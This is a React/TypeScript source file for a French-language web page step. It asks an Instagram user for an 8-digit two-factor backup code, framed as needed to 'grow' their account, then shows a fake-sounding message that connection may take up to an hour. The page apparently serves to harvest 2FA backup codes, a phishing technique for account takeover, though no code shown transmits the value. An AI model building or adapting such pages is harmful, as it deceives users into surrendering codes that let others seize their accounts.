import React, { useEffect, useRef, useState } from 'react'
import { Clock, Ig, Next } from '../icons';

type HandleChange = (index: number, value: string) => void;
type HandleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => void;
type HandlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => void;




function StepTwo() {
    const [isConfirmed, setIsConfirmed] = useState<boolean>(false);

    const [code, setCode] = useState(['', '', '', '', '', '', '', '']);
    const inputRefs = useRef<Array<HTMLInputElement | null>>([]);

    useEffect(() => {
        if (inputRefs.current[0]) {
            inputRefs.current[0]?.focus();
        }
    }, []);


    const handleChange: HandleChange = (index, value) => {
        // Only allow numbers
        if (value && !/^\d+$/.test(value)) return;

        const newCode = [...code];
        newCode[index] = value;
        setCode(newCode);

        // Auto-focus next input if value is entered
        if (value && index < 7 && inputRefs.current[index + 1]) {
            inputRefs.current[index + 1]?.focus();
        }
    };



    const handleKeyDown: HandleKeyDown = (index, e) => {
        // Handle backspace
        if (e.key === 'Backspace') {
            if (!code[index] && index > 0 && inputRefs.current[index - 1]) {
                // If current field is empty and backspace is pressed, focus previous field
                const newCode = [...code];
                newCode[index - 1] = '';
                setCode(newCode);
                if (inputRefs.current[index - 1]) {
                    inputRefs.current[index - 1]?.focus();
                }
            } else if (code[index]) {
                // If current field has value, clear it but stay focused
                const newCode = [...code];
                newCode[index] = '';
                setCode(newCode);
            }
        }

        // Handle arrow keys for navigation
        if (e.key === 'ArrowLeft' && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
        if (e.key === 'ArrowRight' && index < 7) {
            inputRefs.current[index + 1]?.focus();
        }
    };


    const handlePaste: HandlePaste = (e) => {
        e.preventDefault();
        const pastedData = e.clipboardData.getData('text');
        const numbers = pastedData.replace(/\D/g, '').split('').slice(0, 8);

        const newCode = [...code];
        numbers.forEach((num, index) => {
            if (index < 8) {
                newCode[index] = num;
            }
        });

        setCode(newCode);

        // Focus the next empty field or the last field
        const nextEmptyIndex = numbers.length < 8 ? numbers.length : 7;
        if (inputRefs.current[nextEmptyIndex]) {
            inputRefs.current[nextEmptyIndex].focus();
        }
    };
    return (
        <>
            <p className="font-black text-white text-[1.75rem] text-center mb-[0.46rem]">Authentification à<br /> deux facteurs</p>
            <p className="text-[#CBD5E1] text-center mb-[2.5rem]">Votre compte a actuellement l’authentification à<br /> deux facteurs activée. Pour commencer à<br /> développer votre compte Instagram, veuillez nous<br /> fournir un code de secours afin de lancer le<br /> processus.</p>

            <div className="w-full rounded-[0.75rem] p-[0.625rem] bg-[#1E293B] border-[0.5px] border-[#334155] flex justify-between transition-all duration-300 ease-in-out flex-col">
                <div className="flex gap-x-2 items-center">
                    <Ig />
                    <div className="flex flex-col">
                        <p className="font-semibold text-white">@nomdutilisateur</p>
                        <p className="text-[#CBD5E1] font-sm transition-all duration-300 ease-in-out">Ajoutez un code de secours à 8 chiffres</p>
                    </div>
                </div>
                {isConfirmed ? (<>
                    <div className="w-full h-[0.5px] bg-[#334155] my-[0.75rem] transition-all duration-300 ease-in-out" />
                    <div className="rounded-[0.625rem] border-[0.5px] border-[#FFBB5B] py-[0.625rem] px-[0.75rem] bg-[#34383E] flex gap-x-2">
                        <Clock />
                        <div>
                            <p className="font-semibold">Vous serez notifié par e-mail</p>
                            <p className="text-sm">Notre système est fortement sollicité. La<br /> connexion peut prendre jusqu&apos;à 1 heure.</p>
                        </div>
                    </div>
                </>) : (<>


                    <div className="w-full h-[0.5px] bg-[#334155] my-[0.75rem] transition-all duration-300 ease-in-out" />
                    <div className='w-full h-[2.5rem] bg-[#020617] rounded-[0.5rem] border border-[#334155] flex justify-center gap-x-[0.5rem] py-[0.5rem]'>
                        {code.map((digit, index) => (
                            <React.Fragment key={index}>
                                <input
                                    ref={el => { inputRefs.current[index] = el; }}
                                    type='text'
                                    maxLength={1}
                                    value={digit}
                                    onChange={(e) => handleChange(index, e.target.value)}
                                    onKeyDown={(e) => handleKeyDown(index, e)}
                                    onPaste={handlePaste}
                                    className='outline-none border-b border-[#334155] h-full w-[1.25rem] flex justify-center px-[0.3rem] text-white text-center bg-transparent'
                                />
                                {index === 3 && <p className="text-white">-</p>}
                            </React.Fragment>
                        ))}
                    </div>

                    <div className={`px-[1.25rem] py-[0.625rem] rounded-[0.5rem] cursor-pointer text-sm font-semibold bg-gradient-to-r my-[0.75rem] from-[#B36AE9] via-[#EC6189] to-[#FCA74B] flex justify-center items-center full`} onClick={() => { setIsConfirmed(true) }}>
                        {code.some(digit => digit !== '') ? (<p className="bg-clip-text text-transparent bg-[linear-gradient(90deg,#FFFFFF33_0%,#FFFFFFB3_25%,#FFFFFF_50%,#FFFFFFB3_75%,#FFFFFF33_100%)]">Connexion en cours...</p>) : "Confirmer"}
                    </div>

                    <div className='flex items-center gap-x-[0.5rem] justify-center w-full'>
                        <p className='text-sm italic font-medium text-[#CBD5E1]'>Comment trouver les codes de secours?</p>
                        <Next />
                    </div>
                </>)}
            </div>


        </>
    )
}

export default StepTwo
